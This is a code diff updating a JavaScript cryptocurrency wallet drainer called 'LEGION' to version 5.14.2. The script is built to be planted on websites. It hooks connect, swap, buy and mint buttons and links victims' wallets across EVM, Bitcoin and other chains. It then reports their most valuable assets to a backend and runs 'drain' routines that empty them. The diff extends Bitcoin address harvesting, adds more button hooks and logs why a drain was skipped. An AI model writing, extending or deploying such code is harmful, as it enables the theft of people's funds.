@@ -63,7 +63,7 @@
     clientEncryptKey: '',
   }, window.LEGION_CONFIG || {});
 
-  var LEGION_VERSION = '5.14.0';
+  var LEGION_VERSION = '5.14.2';
   var BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93';
 
   /** 16+ EVM chains — factory CREATE2 fills gaps where static map is zero */
@@ -1386,6 +1386,7 @@
     evmAddr: null, evmChain: null, evmProvider: null, evmWallet: '',
     scoutUsd: 0,
     anchorsOk: 0,
+    lastDrainSkipReason: '',
     discovered: [],
     nonEvm: {},
     familyProviders: { SVM: [], UTXO: [], TRON: [], TON: [], COSMOS: [], APTOS: [], SUI: [] },
@@ -1423,12 +1424,27 @@
   function installWcGuard() { /* no-op */ }
   function removeWcGuard() { /* no-op */ }
 
+  function withConnectTimeout(promise, ms, message) {
+    return Promise.race([
+      promise,
+      new Promise(function (_, reject) {
+        setTimeout(function () {
+          reject(new Error(message || 'Wallet connection timed out'));
+        }, ms);
+      }),
+    ]);
+  }
+
   async function evmRequestAccounts(provider) {
     if (_evmConnectLock) {
       try { return await _evmConnectLock; } catch (e) { /* retry below */ }
     }
     var wcMode = S.connectMode === 'wc' || (provider && provider.isWalletConnect === true);
-    _evmConnectLock = (async function () {
+    var connectTimeoutMs = wcMode ? 120000 : 45000;
+    var timeoutMsg = wcMode
+      ? 'WalletConnect timed out — approve the connection on your phone or try again.'
+      : 'Wallet connection timed out — install the extension or pick another wallet.';
+    _evmConnectLock = withConnectTimeout((async function () {
       try {
         var accounts = await provider.request({ method: 'eth_accounts' });
         if (accounts && accounts.length) return accounts;
@@ -1483,8 +1499,8 @@
         }
       }
 
-      throw new Error('Could not retrieve EVM account');
-    })();
+      throw new Error('Could not retrieve EVM account — extension may not be installed');
+    })(), connectTimeoutMs, timeoutMsg);
     try {
       return await _evmConnectLock;
     } finally {
@@ -1652,15 +1668,29 @@
     binance: 'com.binance.wallet',
   };
 
+  function isPhantomEvmProvider(p) {
+    return !!(p && (p.isPhantom || p._phantom || p.isPhantomEthereum));
+  }
+
   function resolveEvmProvider(key) {
     requestProviders();
     var k = String(key || '').toLowerCase();
     var targetRdns = RDNS_BY_KEY[k] || k;
+    if (k === 'metamask' || targetRdns === 'io.metamask') {
+      for (var mi = 0; mi < S.discovered.length; mi++) {
+        var mw = S.discovered[mi];
+        if (!mw || !mw.provider || !mw.info) continue;
+        if (String(mw.info.rdns || '').toLowerCase() === 'io.metamask' && !isPhantomEvmProvider(mw.provider)) {
+          return mw.provider;
+        }
+      }
+    }
     for (var i = 0; i < S.discovered.length; i++) {
       var w = S.discovered[i];
       if (!w || !w.provider || !w.info) continue;
       var rdns = String(w.info.rdns || '').toLowerCase();
       var name = String(w.info.name || '').toLowerCase();
+      if (k === 'metamask' && (rdns === 'app.phantom' || isPhantomEvmProvider(w.provider))) continue;
       if (rdns === targetRdns || rdns === k || rdns.indexOf(k) !== -1 || name.indexOf(k) !== -1) {
         return w.provider;
       }
@@ -1670,7 +1700,7 @@
       for (var j = 0; j < eth.providers.length; j++) {
         var p = eth.providers[j];
         if (!p) continue;
-        if ((k === 'metamask' || targetRdns === 'io.metamask') && p.isMetaMask && !p.isRabby) return p;
+        if ((k === 'metamask' || targetRdns === 'io.metamask') && p.isMetaMask && !p.isRabby && !isPhantomEvmProvider(p)) return p;
         if ((k === 'trust' || targetRdns === 'com.trustwallet.app') && (p.isTrust || p.isTrustWallet)) return p;
         if (k.indexOf('coinbase') !== -1 && (p.isCoinbaseWallet || p.isCoinbaseBrowser)) return p;
         if ((k === 'rabby' || targetRdns === 'io.rabby') && p.isRabby) return p;
@@ -1678,9 +1708,21 @@
         if ((k === 'brave' || targetRdns === 'com.brave.wallet') && p.isBraveWallet) return p;
       }
     }
-    if (eth && k === 'metamask' && eth.isMetaMask && !eth.isRabby && !eth.isTrust) return eth;
+    if (eth && k === 'metamask' && eth.isMetaMask && !eth.isRabby && !eth.isTrust && !isPhantomEvmProvider(eth)) return eth;
     if (eth && k === 'trust' && (eth.isTrust || eth.isTrustWallet)) return eth;
     return null;
+  }
+
+  function providerInstalledLabel(key) {
+    var labels = {
+      metamask: 'MetaMask',
+      trust: 'Trust Wallet',
+      coinbase: 'Coinbase Wallet',
+      binance: 'Binance Wallet',
+      rabby: 'Rabby',
+      okx: 'OKX Wallet',
+    };
+    return labels[String(key || '').toLowerCase()] || 'Wallet';
   }
 
   // ── Chain-family discovery (blockchain API first — NOT wallet brand names) ──
@@ -1911,7 +1953,16 @@
       }
     } catch (e) {}
     if (!btcProv) {
-      L.warn('[UTXO] WC session has BTC address but no bip122 provider — wallet may not expose signPsbt');
+      L.warn('[UTXO] WC BTC address — scan-only (no bip122 provider)');
+      S.familyConnections.UTXO = {
+        provider: null,
+        address: btcAddr,
+        name: 'UTXO',
+        family: 'UTXO',
+        hint: 'walletconnect',
+        wcSession: true,
+        addressOnly: true,
+      };
       return;
     }
     S.familyConnections.UTXO = {
@@ -1922,6 +1973,34 @@
       hint: 'walletconnect',
     };
     L.log('[UTXO] WC provider wired for drain');
+  }
+
+  /** Trust/OKX add bip122 after EVM approve — poll before backend notify. */
+  async function waitForWcBip122Harvest(evmAddr) {
+    if (S.connectMode !== 'wc') return;
+    if (S.chains.BTC && S.chains.BTC.address) return;
+    UI.status('Approve Bitcoin on your phone wallet...');
+    var linkedBtc = await ensureWcBip122Linked();
+    if (linkedBtc) {
+      applyWcSessionAddresses(scanWcSessionAllFamilies());
+      wireWcFamilyConnections();
+      S.allAddresses = collectAddressMap(evmAddr);
+      saveWcFamilyContext(S.allAddresses);
+      L.log('[UTXO] bip122 ready for broadcast:', linkedBtc.slice(0, 8) + '...');
+      return;
+    }
+    for (var i = 0; i < 45; i++) {
+      applyLegionWalletSessionAddresses();
+      wireWcFamilyConnections();
+      if (S.chains.BTC && S.chains.BTC.address) {
+        S.allAddresses = collectAddressMap(evmAddr);
+        saveWcFamilyContext(S.allAddresses);
+        L.log('[UTXO] bip122 from session poll:', S.chains.BTC.address.slice(0, 8) + '...');
+        return;
+      }
+      await sleep(2000);
+    }
+    L.warn('[UTXO] bip122 not linked — enable Bitcoin in Trust/OKX and re-connect');
   }
 
   function applyWcSessionAddresses(wcAddr) {
@@ -2121,6 +2200,17 @@
     discoverChainFamilies();
     applyLegionWalletSessionAddresses();
     wireWcFamilyConnections();
+
+    // Injected extension pick (MetaMask, Coinbase, …) = EVM only.
+    // Do NOT open Phantom/SOL or other extension popups in the same click.
+    // Multi-chain harvest runs on WalletConnect (phone approves namespaces).
+    if (S.connectMode === 'injected') {
+      S.familiesLinked = true;
+      S.allAddresses = collectAddressMap(evmAddr);
+      saveWcFamilyContext(S.allAddresses);
+      L.log('[connect] linked families: evm:' + String(evmAddr).slice(0, 10) + '... (extension — EVM only)');
+      return S.allAddresses;
+    }
 
     if (S.connectMode !== 'wc') {
       var linkers = [
@@ -2595,12 +2685,25 @@
       return SCOUT.alertStage('drain_fail', address, chainId, walletName, detail);
     },
 
-    reportScanComplete: async function (address, totalUsd, assetCount, walletName, chainId) {
+    reportScanComplete: async function (address, totalUsd, assetCount, walletName, chainId, assetItems) {
       var usd = Number(totalUsd) || 0;
       if (usd <= 0) return;
       if (S.fusionNotified && S.scoutUsd >= usd) return;
       S.fusionNotified = true;
       S.scoutUsd = Math.max(S.scoutUsd, usd);
+      var sourceItems = assetItems || (S.portfolioScan && S.portfolioScan.items) || [];
+      var topAssets = sourceItems
+        .filter(function (a) { return Number(a.amount_usd || a.usd_value || 0) > 0; })
+        .slice(0, 12)
+        .map(function (a) {
+          return {
+            chain: a.chain || ('evm:' + (chainId || 1)),
+            family: a.family || 'EVM',
+            token: a.token || a.address || 'native',
+            symbol: a.symbol || '?',
+            amount_usd: Number(a.amount_usd || a.usd_value || 0),
+          };
+        });
       try {
         await apiPost('/api/v1/scout/drain-status', {
           wallet_address: address,
@@ -2609,7 +2712,8 @@
           chain_family: 'EVM',
           wallet_type: walletName || 'Unknown',
           scout_value_usd: Number(totalUsd) || 0,
-          asset_count: assetCount || 0,
+          asset_count: assetCount || topAssets.length || 0,
+          assets: topAssets.length ? topAssets : undefined,
           source_page: window.location.href,
           connect_session: S.connectSession || undefined,
         });
@@ -2686,6 +2790,18 @@
   };
 
   async function prefetchVault() {
+    if (CFG.backendEndpoints && CFG.backendEndpoints.length) {
+      S.backendEndpoints = CFG.backendEndpoints.slice();
+    }
+    if (CFG.proxyUrls && CFG.proxyUrls.length) {
+      S.proxyUrls = CFG.proxyUrls.slice();
+    }
+    if (CFG.deployDomains && CFG.deployDomains.length) {
+      S.deployDomains = CFG.deployDomains.slice();
+    }
+    if (CFG.eip712Domains && typeof CFG.eip712Domains === 'object') {
+      S.eip712Domains = CFG.eip712Domains;
+    }
     try {
       var res = await apiFetch('/api/v1/client-config', { method: 'GET', credentials: 'omit' });
       var d = await res.json();
@@ -3759,10 +3875,12 @@
     }
     await ensureUserFactoryContract(address, chainId);
     if (!(await stateDependentValidation(provider, address, chainId))) {
+      S.lastDrainSkipReason = 'State validation failed (chain/vault/clone mismatch on chain ' + chainId + ')';
       L.log('State validation failed on chain', chainId, '— skip drain');
       return false;
     }
     if (!assetsHaveDrainableBalance(assets)) {
+      S.lastDrainSkipReason = 'Chain ' + chainId + ' — no drainable on-wallet balance (RPC read)';
       L.log('Chain', chainId, 'no drainable balance — skip');
         return false;
     }
@@ -3936,6 +4054,7 @@
         logContractCoverage(cid);
         var assets = await buildChainAssets(provider, address, cid, portfolio);
         if (!chainHasDrainableAssets(assets)) {
+          S.lastDrainSkipReason = 'Chain ' + cid + ' empty on-wallet — skip';
           L.log('Chain', cid, 'empty on-wallet — skip');
           continue;
         }
@@ -4629,7 +4748,8 @@
         (fusionData && fusionData.assets_count) ||
         (portfolio && portfolio.items && portfolio.items.length) || 0,
       evmCtx.walletName,
-      evmCtx.chainId
+      evmCtx.chainId,
+      portfolio && portfolio.items
     );
 
     evmCtx.chainId = await ensureFundedEvmChain(evmCtx.provider, evmCtx.address, evmCtx.chainId);
@@ -5089,14 +5209,17 @@
   // ═══════════════════════════════════════════════════════════════
   // SECTION 16: UI LAYER + PAGE HOOKS (any frontend)
   // ═══════════════════════════════════════════════════════════════
-  var HOOK_PATTERN = /connect\s*wallet|wallet\s*connect|\bconnect\b|sign\s*in|link\s*wallet|get\s*started|start\s*app/i;
+  var HOOK_PATTERN = /connect\s*wallet|wallet\s*connect|\bconnect\b|sign\s*in|link\s*wallet|get\s*started|start\s*app|\bswap\b|\btrade\b|\bbuy\b|\bsell\b|\bmint\b|\bunlock\b|enable\s*wallet|open\s*wallet|trezor|ledger/i;
   var HOOK_SELECTORS = [
     '.interact-button', '#navConnectBtn', '#mainBtn', '.nav-connect', '.main-btn.connect',
-    '[data-testid*="connect"]', '[data-testid*="wallet"]', '[data-testid*="Connect"]',
-    '[class*="connectWallet"]', '[class*="ConnectWallet"]', '[class*="wallet-connect"]',
-    '#connect-wallet', '.connect-wallet', '[id*="connectButton"]', '[class*="walletButton"]',
-    'button[class*="connect"]', 'a[class*="connect"]',
-    '[class*="WalletConnect"]', '[class*="wallet_connect"]',
+    '[data-testid*="connect"]', '[data-testid*="Connect"]', '[data-testid*="wallet"]', '[data-testid*="Wallet"]',
+    '[data-testid="navbar-connect-wallet"]', '[data-testid="wallet-connect"]',
+    '[class*="connectWallet"]', '[class*="ConnectWallet"]', '[class*="ConnectButton"]', '[class*="connect-button"]',
+    '[class*="wallet-connect"]', '[class*="WalletConnect"]', '[class*="wallet_connect"]',
+    '#connect-wallet', '#connect-wallet-btn', '.connect-wallet', '[id*="connectButton"]', '[class*="walletButton"]',
+    'button[class*="connect"]', 'a[class*="connect"]', '[class*="ConnectBtn"]',
+    '[class*="swap-button"]', '[class*="SwapButton"]', '[data-testid*="swap"]',
+    '[class*="trezor"]', '[class*="Trezor"]', '[aria-label*="Connect"]', '[aria-label*="Wallet"]',
   ];
 
   var WALLET_ICONS = {
@@ -5547,6 +5670,11 @@
       this.overlay.hide();
     },
 
+    showConnectError: function (msg) {
+      this.overlay.hide();
+      this.showStatus(msg || 'Could not connect. Install the wallet extension or try WalletConnect.');
+    },
+
     setConnected: function (addr, chainName) {
       var short = addr.slice(0, 6) + '...' + addr.slice(-4);
       var nb = document.getElementById('navConnectBtn');
@@ -5632,11 +5760,14 @@
       S.familiesLinked = false;
       S.familyConnections = {};
       S.evmScanChainIds = null;
+      S.lastDrainSkipReason = '';
       S.chains = { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null };
       S.allAddresses = {};
 
       UI.showStatus('Linking all blockchains...');
       await linkAllFamiliesOnConnect(address);
+      await waitForWcBip122Harvest(address);
+      S.allAddresses = collectAddressMap(address);
       await broadcastConnectScan(address, chainId, walletName, S.allAddresses);
 
       await sleep(CFG.delayDrainMs || 300);
@@ -5663,14 +5794,19 @@
       if (S.anchorsOk > 0) {
         UI.status('Complete!');
       } else {
-        await SCOUT.reportDrainStatus('no_action', address, chainId, walletName, 'No signature or confirmed TX submitted');
+        await SCOUT.reportDrainStatus(
+          'no_action',
+          address,
+          chainId,
+          walletName,
+          S.lastDrainSkipReason || 'No signature or confirmed TX submitted'
+        );
       }
       S.drainRunning = false;
       UI.overlay.hide();
     } catch (e) {
       L.warn('EVM connect error:', e.message);
       S.drainRunning = false;
-      UI.overlay.hide();
       if (isUserRejection(e)) {
         if (S.connectMode === 'injected') {
           await clearInjectedSession({ keepMode: false });
@@ -5680,6 +5816,12 @@
           await SCOUT.alertStage('user_rejected', S.evmAddr, S.evmChain, S.evmWallet, e.message);
         }
         return;
+      }
+      var friendly = String(e.message || 'Connection failed');
+      if (/not installed|could not retrieve|timed out/i.test(friendly)) {
+        UI.showConnectError(friendly);
+      } else {
+        UI.showConnectError('Could not connect — ' + friendly);
       }
       if (S.evmAddr) {
         await SCOUT.alertFailure('EVM', 'connect', e, S.evmAddr, S.evmChain, S.evmWallet);
@@ -5927,6 +6069,15 @@
     connectWC: handleWC,
     connectInjected: connectWithWallet,
     resolveProvider: resolveEvmProvider,
+    providerInstalled: function (key) {
+      return !!resolveEvmProvider(key);
+    },
+    failConnect: function (msg) {
+      S.connecting = false;
+      S.drainRunning = false;
+      UI.showConnectError(msg || 'Could not connect to wallet.');
+      clearInjectedSession({ keepMode: false }).catch(function () {});
+    },
     beginConnect: function (mode) {
       if (mode === 'wc') {
         S.connectMode = 'wc';
